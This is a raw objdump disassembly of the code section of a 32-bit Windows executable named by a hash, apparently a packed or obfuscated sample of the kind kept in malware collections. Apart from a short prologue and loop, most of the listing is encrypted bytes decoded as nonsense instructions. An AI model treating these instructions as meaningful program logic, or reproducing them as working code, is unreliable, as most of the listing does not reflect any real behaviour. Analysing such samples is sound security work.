
ac3b999d10f7adc237a1702a051df70d67d0f1da706c40290daccbe2af7e4f75.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0xb742bc08,cl
  401025:	mov    bh,0x7e
  401027:	jle    0x4010a7
  401029:	jle    0x40109a
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    edx,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    DWORD PTR [edi],ecx
  40103c:	add    BYTE PTR [edi],cl
  40103e:	xor    ecx,DWORD PTR [edi]
  401040:	rcr    BYTE PTR [eax],0xc7
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0xedb9b5a5
  4010d8:	jle    0x40108e
  4010da:	fwait
  4010db:	push   0x138db492
  4010e0:	mov    esp,0x44ae31da
  4010e5:	repz sub eax,0x81f253a0
  4010eb:	retf   0x6bed
  4010ee:	imul   DWORD PTR [ebp*4+0x24ce36f1]
  4010f5:	push   eax
  4010f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f7:	outs   dx,BYTE PTR ds:[esi]
  4010f9:	inc    esp
  4010fa:	mov    cl,0x7f
  4010fc:	xchg   edx,eax
  4010fd:	push   es
  4010fe:	jno    0x4010ea
  401100:	mov    ebp,0x79b70f0d
  401105:	pop    ds
  401106:	cmp    DWORD PTR [esp-0x69],esi
  40110a:	(bad)  
  40110c:	pop    edi
  40110d:	scas   eax,DWORD PTR es:[edi]
  40110e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40110f:	cli    
  401110:	jbe    0x401123
  401112:	ficom  DWORD PTR [esi]
  401114:	mov    ch,0xb6
  401116:	ucomiss xmm7,DWORD PTR [eax-0x3c9f558b]
  40111d:	scas   al,BYTE PTR es:[edi]
  40111e:	mov    eax,0xcbb64ddb
  401123:	xchg   ebx,eax
  401124:	in     al,0x7d
  401126:	loop   0x401122
  401128:	mov    al,ds:0x7a1018e2
  40112d:	(bad)
  401131:	or     esp,edx
  401133:	dec    ecx
  401134:	retf   0xa336
  401137:	sub    BYTE PTR [edi+0x54],bl
  40113a:	mov    ebx,0xf7332c96
  40113f:	jns    0x40118b
  401141:	sub    al,0x38
  401143:	push   ebp
  401144:	mov    ds,WORD PTR [esp+ebx*2]
  401147:	imul   ecx,DWORD PTR [esi-0x9dcbd0b],0xffffffa6
  40114e:	enter  0x61f,0x2e
  401152:	jo     0x40116c
  401154:	lea    ebx,[ebp-0x30]
  401157:	or     eax,0xe7b5a070
  40115c:	rcr    DWORD PTR [ecx-0x3d],cl
  40115f:	ret    
  401160:	iret   
  401161:	in     al,0x85
  401163:	pop    edi
  401164:	sahf   
  401165:	adc    ch,bh
  401167:	push   cs
  401168:	ins    BYTE PTR es:[edi],dx
  401169:	(bad)  
  40116a:	(bad)  
  40116b:	daa    
  40116c:	inc    esp
  40116e:	and    BYTE PTR [ecx-0x26],0xe7
  401172:	add    eax,0x8036f74c
  401177:	adc    al,0x95
  401179:	adc    al,0x9d
  40117b:	pop    eax
  40117c:	es daa 
  40117e:	pop    ebp
  40117f:	xchg   al,cl
  401181:	xor    al,0x1f
  401183:	repz push ss
  401185:	adc    al,0x6d
  401187:	mov    al,ds:0x83f5a07a
  40118c:	push   cs
  40118d:	sti    
  40118e:	lods   al,BYTE PTR ds:[esi]
  40118f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401190:	push   ebp
  401191:	jno    0x40117f
  401193:	nop
  401194:	jbe    0x40111c
  401196:	fs xchg edx,eax
  401198:	xchg   edi,eax
  401199:	xor    ebp,DWORD PTR [edi-0x9b83263]
  40119f:	push   edi
  4011a0:	sbb    edi,DWORD PTR [esp+ebx*1+0x19]
  4011a4:	into   
  4011a5:	adc    dh,dl
  4011a7:	ja     0x4011cd
  4011a9:	test   eax,0xb92334eb
  4011ae:	or     dl,BYTE PTR [eax-0x75]
  4011b1:	and    DWORD PTR [eax-0x5bfd268e],esi
  4011b7:	add    DWORD PTR [esi-0x112bf042],esi
  4011bd:	test   eax,0x62c879af
  4011c2:	out    dx,eax
  4011c3:	fdivr  st,st(5)
  4011c5:	loop   0x40116d
  4011c7:	sbb    cl,dl
  4011c9:	and    eax,0xa6534a08
  4011ce:	push   es
  4011cf:	fisub  WORD PTR [ebx-0x30]
  4011d2:	leave  
  4011d3:	cmp    eax,0x6a5a6149
  4011d8:	pop    esi
  4011d9:	cdq    
  4011da:	test   DWORD PTR [ebx+0x32fb57ab],eax
  4011e0:	ds retf 0x9808
  4011e4:	sub    al,0x2a
  4011e6:	clc    
  4011e7:	scas   al,BYTE PTR es:[edi]
  4011e8:	xor    DWORD PTR [edx+0x2f63c101],0x73
  4011ef:	jle    0x401253
  4011f1:	bound  ecx,QWORD PTR [eax+0x7]
  4011f4:	rcl    ebx,0x5f
  4011f7:	cmp    bl,BYTE PTR [ebx]
  4011f9:	xor    ah,BYTE PTR [ebx+0x38]
  4011fc:	(bad)  
  4011fe:	loopne 0x4011ba
  401200:	das    
  401201:	ffreep st(3)
  401203:	clc    
  401204:	jle    0x40120f
  401206:	aaa    
  401207:	mov    esi,0x91245e57
  40120c:	mov    ah,BYTE PTR [ebp+eiz*2-0xf]
  401210:	rcr    BYTE PTR [edi-0x57b5ee4f],0x1a
  401217:	pop    ecx
  401218:	fsubr  QWORD PTR [edi]
  40121a:	sbb    DWORD PTR [ecx+0x21ea0c6d],ebp
  401220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401221:	dec    edx
  401222:	sub    BYTE PTR [eax],0x11
  401225:	xchg   esp,eax
  401226:	add    eax,0xee7f353d
  40122b:	cli    
  40122c:	popa   
  40122d:	push   edi
  40122e:	or     BYTE PTR [esi-0x536bbfd0],bl
  401234:	retf   
  401235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401236:	push   esi
  401237:	and    DWORD PTR [edx-0x71651d3f],ebx
  40123d:	repnz fld st(4)
  401240:	inc    ecx
  401241:	adc    eax,0xd8a79ae
  401246:	pop    esp
  401247:	icebp  
  401248:	outs   dx,BYTE PTR ds:[esi]
  401249:	push   ebp
  40124a:	mov    ds:0xfa90f5a6,al
  40124f:	cmp    dl,BYTE PTR [ecx]
  401251:	mov    WORD PTR [esi-0x30981ac6],es
  401257:	sbb    ah,dh
  401259:	xor    al,0x76
  40125b:	stos   BYTE PTR es:[edi],al
  40125c:	mov    cl,0xdc
  40125e:	mov    al,0xf6
  401260:	rol    BYTE PTR [edi-0x32],cl
  401263:	xor    eax,0x7fbda734
  401268:	loop   0x40124e
  40126a:	cld    
  40126b:	outs   dx,DWORD PTR ds:[esi]
  40126c:	lea    edi,[ecx-0x6]
  40126f:	xchg   cl,cl
  401271:	mov    ecx,0x96bde4a8
  401276:	in     al,dx
  401277:	les    edx,FWORD PTR [ebx]
  401279:	inc    eax
  40127a:	clc    
  40127b:	xchg   edx,eax
  40127c:	lods   al,BYTE PTR ds:[esi]
  40127d:	sbb    DWORD PTR [edi],0xffffff8d
  401280:	fs jg  0x401208
  401283:	mul    BYTE PTR [edx-0x14]
  401286:	retf   
  401287:	stos   BYTE PTR es:[edi],al
  401288:	adc    cl,BYTE PTR [ebx-0x5c61061]
  40128e:	ds adc cl,0xff
  401292:	clc    
  401293:	mov    dh,0x59
  401295:	data16 fwait
  401297:	xor    al,0xc9
  401299:	inc    edx
  40129a:	xlat   BYTE PTR ds:[ebx]
  40129b:	xor    BYTE PTR [ebx-0xa],al
  40129e:	imul   esi,DWORD PTR [ecx-0x3c5bcc1a],0x92545e4f
  4012a8:	hlt    
  4012a9:	imul   edx,DWORD PTR [esi+0x7c58cfb8],0x11b8dbd5
  4012b3:	test   DWORD PTR [edi+0x3d512671],esp
  4012b9:	test   al,0x18
  4012bb:	test   eax,0x9cb38f03
  4012c0:	les    esp,FWORD PTR [eax]
  4012c2:	sbb    ch,BYTE PTR [edx]
  4012c4:	daa    
  4012c5:	daa    
  4012c6:	xor    al,0xec
  4012c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012c9:	jne    0x401306
  4012cb:	pusha  
  4012cc:	test   eax,0x4cb4cc9a
  4012d1:	xlat   BYTE PTR cs:[ebx]
  4012d3:	and    al,0x34
  4012d5:	xor    eax,0xb915188c
  4012da:	into   
  4012db:	and    DWORD PTR [ecx-0x73],ebx
  4012de:	jns    0x40135d
  4012e0:	dec    eax
  4012e1:	in     eax,0x52
  4012e3:	(bad)  
  4012e4:	cmp    al,0xe5
  4012e6:	stos   DWORD PTR es:[edi],eax
  4012e7:	xchg   edi,eax
  4012e8:	enter  0xf62f,0x72
  4012ec:	jmp    0x37c6a549
  4012f1:	outs   dx,DWORD PTR ds:[esi]
  4012f2:	out    dx,al
  4012f3:	retf   0xec35
  4012f6:	mov    cl,0x9b
  4012f8:	push   edi
  4012f9:	mov    eax,ds:0xa278f7c4
  4012fe:	call   0x8efb1e83
  401303:	mov    eax,ds:0xc3e1503e
  401308:	int3   
  401309:	hlt    
  40130a:	or     eax,0x5df7755b
  40130f:	mov    dh,0xb
  401311:	(bad)  
  401312:	sbb    DWORD PTR [ecx],edi
  401314:	mov    esi,0x1b974e30
  401319:	gs repnz cli 
  40131c:	inc    ebp
  40131d:	cld    
  40131e:	cmp    edi,esi
  401320:	sbb    DWORD PTR [eax-0x60d933c3],esp
  401326:	pop    esi
  401327:	(bad)  
  401328:	xchg   ebx,eax
  401329:	jo     0x4013a7
  40132b:	lahf   
  40132c:	icebp  
  40132d:	add    al,0xcc
  40132f:	cmp    BYTE PTR [eax],ch
  401331:	inc    esp
  401332:	mov    esi,0x81d442ea
  401338:	add    esp,eax
  40133a:	lock lock in eax,0x64
  40133e:	loop   0x401324
  401340:	xchg   ebx,eax
  401341:	sbb    al,0x14
  401343:	xor    dh,BYTE PTR [ecx]
  401345:	jg     0x4013c4
  401347:	and    BYTE PTR [edi-0x13938d0d],ah
  40134d:	lock shr BYTE PTR [ecx],0xbf
  401351:	pop    esp
  401352:	pop    edx
  401353:	cmp    dl,BYTE PTR [ebx+0x207e7fd5]
  401359:	sub    eax,0xfa22d3df
  40135e:	push   ds
  40135f:	or     al,0xe5
  401361:	inc    esp
  401362:	inc    ebp
  401363:	jbe    0x4012ff
  401365:	add    al,0xe8
  401367:	stos   DWORD PTR es:[edi],eax
  401368:	mov    ebx,0xde56591e
  40136d:	test   BYTE PTR [esi],0xb7
  401370:	sub    al,0x13
  401372:	addr16 mov cl,0xe7
  401375:	xor    DWORD PTR [eax],0x565ecb52
  40137b:	lods   eax,DWORD PTR ds:[esi]
  40137c:	push   edi
  40137d:	(bad)  
  40137e:	pop    ds
  40137f:	aas    
  401380:	cmp    dh,BYTE PTR [edi+0x1e]
  401383:	test   eax,0xfb3dcbb4
  401388:	xchg   DWORD PTR [eax+0x28c16774],esp
  40138e:	mov    ah,0x71
  401390:	lock je 0x4013fd
  401393:	cmp    edx,DWORD PTR [edx+0x66ced754]
  401399:	iret   
  40139a:	enter  0xd154,0xd6
  40139e:	(bad)  
  40139f:	out    dx,eax
  4013a0:	stos   DWORD PTR es:[edi],eax
  4013a1:	or     eax,0xc0007748
  4013a6:	mul    BYTE PTR [edx+ebp*8]
  4013a9:	fisttp WORD PTR [ebx+0x3a96148]
  4013af:	push   dx
  4013b1:	fsub   QWORD PTR ds:0xc26dbe78
  4013b7:	pop    ebx
  4013b8:	xchg   edx,eax
  4013b9:	(bad)  
  4013ba:	call   0xf7108fa5
  4013bf:	into   
  4013c0:	xor    bl,BYTE PTR [eax]
  4013c2:	jno    0x40135a
  4013c4:	hlt    
  4013c5:	mov    esi,0x5d71f0e7
  4013ca:	ss repnz xchg ebp,eax
  4013cd:	cdq    
  4013ce:	cmp    ebx,DWORD PTR [ecx+0x3a]
  4013d1:	sub    DWORD PTR [ebx-0x24],edx
  4013d4:	add    edi,DWORD PTR [edx]
  4013d6:	scas   eax,DWORD PTR es:[edi]
  4013d7:	add    edi,DWORD PTR [esi+0x3ad2548c]
  4013dd:	fistp  WORD PTR [eax]
  4013df:	adc    al,0x2c
  4013e1:	inc    esi
  4013e2:	shl    DWORD PTR [esi],cl
  4013e4:	bound  edx,QWORD PTR [edx+0x3]
  4013e7:	std    
  4013e8:	jb     0x401419
  4013ea:	mov    eax,ds:0x69aadee5
  4013ef:	sbb    BYTE PTR [ebp+0x1901b3bc],cl
  4013f5:	shr    DWORD PTR [edi-0x62],0xf1
  4013f9:	mov    bh,0x88
  4013fb:	fbld   TBYTE PTR [ebx-0x6d]
  4013fe:	xor    al,0x7
  401400:	jae    0x4013bf
  401402:	test   eax,0x8f06cb8f
  401407:	cld    
  401408:	test   al,0xff
  40140a:	mov    bl,0xa5
  40140c:	dec    eax
  40140d:	fcom   st(3)
  40140f:	inc    esp
  401410:	xor    edi,DWORD PTR [ebp+0x5b0d0e88]
  401416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401417:	cmp    eax,0x6d01a562
  40141c:	inc    esi
  40141d:	mov    dh,0xd5
  40141f:	mov    eax,ds:0x413cee
  401424:	mov    DWORD PTR [ebp-0x48],eax
  401427:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40142e:	adc    eax,0x6013
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43364b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433673,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4336eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4336f3
  401461:	sbb    DWORD PTR ds:0x4336ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433743,0x1c
  401476:	cmp    DWORD PTR ds:0x433743,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433743,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433743
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433743,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    ecx,DWORD PTR [edx+ecx*1]
  4014c3:	jle    0x4014c6
  4014c5:	outs   dx,DWORD PTR ds:[esi]
  4014c6:	jge    0x401546
  4014c8:	jle    0x401539
  4014ca:	jge    0x40154a
  4014cc:	jle    0x401541
  4014ce:	das    
  4014cf:	add    eax,0x5a7e5841
  4014d4:	jmp    0xc5c5:0x915d7c3c
  4014db:	(bad)  
  4014dc:	jmp    0x1527:0xcbe2df93
  4014e3:	outs   dx,DWORD PTR ds:[esi]
  4014e4:	push   ebx
  4014e5:	lock sbb eax,DWORD PTR [eax+eax*8-0x4]
  4014ea:	sbb    eax,0x12bbad32
  4014ef:	xchg   BYTE PTR [eax-0xb7a5525],dh
  4014f5:	xchg   edi,eax
  4014f6:	xchg   ebp,eax
  4014f7:	adc    edx,esp
  4014f9:	adc    ebp,DWORD PTR [esi+0x1b72cc6d]
  4014ff:	mov    bh,0x69
  401501:	mov    ds:0xdaa659e7,al
  401506:	mov    DWORD PTR [edi],eax
  401508:	add    eax,0x1132cfcc
  40150d:	loope  0x4014b3
  40150f:	shr    DWORD PTR [ebx],1
  401511:	xchg   edx,eax
  401512:	out    0x55,eax
  401514:	mov    dl,BYTE PTR [edx+0x37]
  401517:	je     0x40150e
  401519:	push   ecx
  40151a:	(bad)  
  40151c:	rcr    BYTE PTR [ecx+0x35],cl
  40151f:	jl     0x401592
  401521:	xlat   BYTE PTR ds:[ebx]
  401522:	sub    eax,0x6fe9579f
  401527:	adc    eax,0x9a94204a
  40152c:	add    BYTE PTR [edx+0x5c500d98],0xce
  401533:	mov    esp,0x1be8e06f
  401538:	aas    
  401539:	xchg   ebp,eax
  40153a:	mov    ds:0x7524c5df,al
  40153f:	pop    ebp
  401540:	pop    ecx
  401541:	jns    0x4015b8
  401543:	push   ebx
  401544:	aas    
  401545:	call   0x7fc5:0x4d4ebff7
  40154c:	inc    ecx
  40154d:	ds aaa 
  40154f:	inc    eax
  401550:	loop   0x401500
  401552:	repz repnz cdq 
  401555:	inc    eax
  401556:	cwde   
  401557:	mov    eax,0x8d7deaa1
  40155c:	enter  0x61f2,0x75
  401560:	jg     0x401513
  401562:	pop    ss
  401563:	or     bl,ah
  401565:	inc    ebx
  401566:	inc    ebp
  401567:	test   DWORD PTR [ecx],esi
  401569:	repz sub eax,0x40790824
  40156f:	call   0x1ffb:0x87fc6edf
  401576:	pop    edi
  401577:	or     dl,bh
  401579:	ficomp WORD PTR [ebp+0xcbe1edc]
  40157f:	les    edi,FWORD PTR [ecx]
  401581:	les    edi,FWORD PTR [ebx]
  401583:	test   eax,0x1bd524be
  401588:	in     eax,0x76
  40158a:	push   esi
  40158c:	mov    esp,ds
  40158e:	iret   
  40158f:	jp     0x4015e1
  401591:	sbb    al,0xc4
  401593:	lods   al,BYTE PTR ds:[esi]
  401594:	mov    bl,0xf6
  401596:	fnsave [ebp+0x3a]
  401599:	sbb    al,0x74
  40159b:	or     al,0x64
  40159d:	pop    esi
  40159e:	adc    BYTE PTR [edx+0x3d83c8fb],0xf8
  4015a5:	and    eax,0x246dc56f
  4015aa:	in     eax,dx
  4015ab:	loope  0x4015db
  4015ad:	cmp    eax,DWORD PTR [ecx+0x73]
  4015b0:	jmp    0xa462:0x9b1b5e14
  4015b7:	adc    bl,BYTE PTR ds:0x3c414dac
  4015bd:	pop    eax
  4015be:	push   esi
  4015bf:	das    
  4015c0:	nop
  4015c1:	sbb    edi,edi
  4015c3:	scas   al,BYTE PTR es:[edi]
  4015c4:	ins    BYTE PTR es:[edi],dx
  4015c5:	fbstp  TBYTE PTR [ecx-0x7f]
  4015c8:	cdq    
  4015c9:	retf   
  4015ca:	sbb    BYTE PTR [esp+ebx*8-0x23],al
  4015ce:	mov    ebp,0x7192d1ac
  4015d3:	inc    ecx
  4015d4:	pop    esi
  4015d5:	jnp    0x401584
  4015d7:	push   ebx
  4015d8:	mov    eax,ds:0xbece4c45
  4015dd:	sahf   
  4015de:	in     al,0x36
  4015e0:	scas   eax,DWORD PTR es:[edi]
  4015e1:	ret    0xc4f4
  4015e4:	leave  
  4015e5:	pop    es
  4015e6:	in     al,0x2b
  4015e8:	push   esp
  4015e9:	mov    ds:0x7cd17920,eax
  4015ee:	test   dl,dl
  4015f0:	sub    edx,DWORD PTR [esi-0x2b]
  4015f3:	test   eax,0xf6e6d8b3
  4015f8:	sbb    al,0x36
  4015fa:	add    eax,0xbfcf57cf
  4015ff:	jbe    0x401593
  401601:	xchg   edi,eax
  401602:	cmp    eax,0x66827411
  401607:	fidivr WORD PTR [edx-0x60e23f6b]
  40160d:	cmp    eax,0xa109d73e
  401612:	lods   al,BYTE PTR ds:[esi]
  401613:	xchg   DWORD PTR [ecx+0x37537437],esi
  401619:	xor    BYTE PTR [ebp-0x72d01714],bl
  40161f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401620:	leave  
  401621:	test   BYTE PTR [edx],bl
  401623:	(bad)  
  401624:	cmp    al,0x86
  401626:	mov    cl,0x50
  401628:	add    ebp,DWORD PTR ds:0xe04e4180
  40162e:	dec    dh
  401630:	daa    
  401631:	(bad)  
  401632:	sti    
  401633:	jmpw   0x84da
  401637:	dec    edx
  401638:	fucomi st,st(0)
  40163a:	pop    esp
  40163b:	pusha  
  40163c:	xor    bh,BYTE PTR [ebx-0x6b]
  40163f:	and    BYTE PTR [edi+eax*8-0x402f4017],ah
  401646:	sub    BYTE PTR [eax+0xf0d5e2e],dl
  40164c:	into   
  40164d:	out    dx,eax
  40164e:	dec    ecx
  40164f:	(bad)  
  401650:	sbb    al,BYTE PTR [ecx+0x7a]
  401653:	cwde   
  401654:	repnz mov bl,0xf9
  401657:	sahf   
  401658:	cs mov cs,ebp
  40165b:	push   ecx
  40165c:	inc    ebx
  40165d:	cld    
  40165e:	inc    esp
  40165f:	stos   BYTE PTR es:[edi],al
  401660:	cs dec esi
  401662:	push   edi
  401663:	or     BYTE PTR ds:0x2f8d9b11,al
  40166a:	sbb    ah,BYTE PTR [esp+edx*4-0x67]
  40166e:	sub    BYTE PTR [ebx-0x6d],al
  401671:	cs inc ecx
  401673:	repnz xchg cx,ax
  401676:	in     eax,0xe2
  401678:	clc    
  401679:	xchg   ecx,eax
  40167a:	pop    ecx
  40167b:	xor    al,0x30
  40167d:	sbb    bl,cl
  40167f:	push   ebx
  401680:	sar    BYTE PTR [edi],0x76
  401683:	(bad)  
  401684:	cmp    BYTE PTR [esi+ebp*8],ch
  401687:	daa    
  401688:	popf   
  401689:	jl     0x401644
  40168b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40168c:	cs jne 0x401625
  40168f:	jle    0x401674
  401691:	inc    esp
  401692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401693:	xchg   ebp,eax
  401694:	push   cs
  401695:	test   eax,0x3a3c371d
  40169a:	mov    ds:0xc7225e0c,eax
  40169f:	pop    esi
  4016a0:	push   esi
  4016a1:	ins    DWORD PTR es:[edi],dx
  4016a2:	cmp    BYTE PTR [eax-0x4e],al
  4016a5:	sar    DWORD PTR [ecx+0x5354bd19],cl
  4016ab:	push   edx
  4016ac:	mov    ds:0x4f574c55,al
  4016b1:	inc    ebp
  4016b2:	xlat   BYTE PTR ds:[ebx]
  4016b3:	stc    
  4016b4:	push   ds
  4016b5:	loop   0x401701
  4016b7:	cs pop edi
  4016b9:	push   0x7ce85da3
  4016be:	jo     0x401696
  4016c0:	outs   dx,BYTE PTR ds:[esi]
  4016c1:	jl     0x40166e
  4016c3:	adc    eax,0x40e6c1e9
  4016c8:	adc    esp,DWORD PTR [eax-0x7340c43f]
  4016ce:	or     al,0x6e
  4016d0:	outs   dx,DWORD PTR ds:[esi]
  4016d1:	fs cmp ebx,edx
  4016d4:	mov    bl,ch
  4016d6:	push   cs
  4016d7:	xor    al,0x22
  4016d9:	neg    DWORD PTR [ebx+0x2a4e0b76]
  4016df:	div    edx
  4016e1:	mov    DWORD PTR [eax+0x3e8d72b4],eax
  4016e7:	sbb    eax,0x587bd139
  4016ec:	sti    
  4016ed:	nop
  4016ee:	adc    ebx,DWORD PTR [edi]
  4016f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f1:	inc    eax
  4016f2:	dec    ebx
  4016f3:	(bad)  
  4016f4:	repz aam 0x95
  4016f7:	mov    edi,0x456533df
  4016fc:	ds lahf 
  4016fe:	test   BYTE PTR [esi-0x385c61c6],al
  401704:	adc    dl,BYTE PTR [edx+ecx*4-0x6a]
  401708:	(bad)  
  401709:	mov    ebx,0x3613363
  40170e:	jno    0x401754
  401710:	push   ecx
  401711:	xchg   BYTE PTR [ebp+0x78],ch
  401714:	ret    
  401715:	cli    
  401716:	add    eax,0x8389c64f
  40171b:	loopne 0x40175c
  40171d:	mov    WORD PTR [eax+0x719b4d15],fs
  401723:	fimul  WORD PTR [ecx+0x5902538a]
  401729:	stc    
  40172a:	scas   eax,DWORD PTR es:[edi]
  40172b:	repnz jecxz 0x4016c5
  40172e:	sub    esi,DWORD PTR [ebp-0x53]
  401731:	pusha  
  401732:	out    0x5a,al
  401734:	sub    esp,0x90e70d1f
  40173a:	cmp    BYTE PTR [eax-0x3bcfc7dd],ah
  401740:	jg     0x4016cf
  401742:	dec    esi
  401743:	xor    edx,ebx
  401745:	les    esi,FWORD PTR [ecx+eax*8-0x22]
  401749:	sbb    BYTE PTR [esi+0x6a],bl
  40174c:	xchg   ecx,eax
  40174d:	aaa    
  40174e:	dec    edx
  40174f:	mov    edx,0xbaa42544
  401754:	adc    dl,BYTE PTR [esi-0x4d]
  401757:	add    BYTE PTR [eax],0xa7
  40175a:	sbb    cl,BYTE PTR [ebp+0xe]
  40175d:	inc    ecx
  40175e:	jmp    0xc942ec2c
  401763:	lea    esi,[edi]
  401765:	(bad)  
  401766:	ins    DWORD PTR es:[edi],dx
  401767:	pavgw  mm5,QWORD PTR [edi-0x5887fa8b]
  40176e:	mov    bh,0x6
  401770:	pop    edi
  401771:	pop    ebx
  401772:	sub    DWORD PTR [edi-0x33cd4a9a],ebx
  401778:	ret    
  401779:	jbe    0x401739
  40177b:	or     DWORD PTR [ebp-0x1b],ecx
  40177e:	pop    edx
  40177f:	and    al,0x20
  401781:	inc    edx
  401782:	loope  0x4017f1
  401784:	outs   dx,DWORD PTR ds:[esi]
  401785:	iret   
  401786:	shl    DWORD PTR ds:0x2646fa3d,cl
  40178c:	jb     0x401804
  40178e:	arpl   WORD PTR [ecx],bp
  401790:	mov    ah,0x51
  401792:	shl    BYTE PTR ds:0xf1ecd420,1
  401798:	(bad)  
  401799:	popa   
  40179a:	push   edi
  40179b:	fnstenv ds:0x5aaf39f6
  4017a1:	int    0xac
  4017a3:	sbb    al,BYTE PTR [ecx+0x3f04a447]
  4017a9:	or     BYTE PTR [esi],0xc4
  4017ac:	lahf   
  4017ad:	(bad)  
  4017ae:	stc    
  4017af:	jmp    0xf05c:0x16d2f49f
  4017b6:	push   eax
  4017b7:	adc    DWORD PTR [ecx],0xb38e37ae
  4017bd:	mov    al,ds:0xac09fda8
  4017c2:	jle    0x40177e
  4017c4:	scas   eax,DWORD PTR es:[edi]
  4017c5:	sub    DWORD PTR [ebx+0x4b],ecx
  4017c8:	scas   al,BYTE PTR es:[edi]
  4017c9:	xor    dh,BYTE PTR [eax-0x5]
  4017cc:	int3   
  4017cd:	xlat   BYTE PTR ds:[ebx]
  4017ce:	test   dl,bh
  4017d0:	mov    WORD PTR [eax+0xc9fe75d],es
  4017d6:	or     dh,0x57
  4017d9:	pop    ebp
  4017da:	pop    ss
  4017db:	mov    al,0x42
  4017dd:	sub    al,0x19
  4017df:	or     ebp,DWORD PTR [ebp+0x398c6feb]
  4017e5:	jl     0x401798
  4017e7:	push   eax
  4017e8:	mov    esi,esp
  4017ea:	or     al,0xcf
  4017ec:	mov    ecx,0x9a580da8
  4017f1:	test   al,0x5f
  4017f3:	xlat   BYTE PTR ds:[ebx]
  4017f4:	ja     0x4017e8
  4017f6:	rcr    DWORD PTR es:[edx+0x2e],1
  4017fa:	aam    0x86
  4017fc:	mov    ah,0xf6
  4017fe:	push   ecx
  4017ff:	mov    esi,0x2b55ed1b
  401804:	jbe    0x4017fa
  401806:	fprem1 
  401808:	lds    esi,FWORD PTR [ebx+esi*8]
  40180b:	pop    ecx
  40180c:	(bad)  
  40180d:	addr16 pop ebp
  40180f:	std    
  401810:	ins    DWORD PTR es:[edi],dx
  401811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401812:	neg    DWORD PTR [eax-0x4ff2944d]
  401818:	jno    0x401853
  40181a:	mov    ebx,0x3d7f09d1
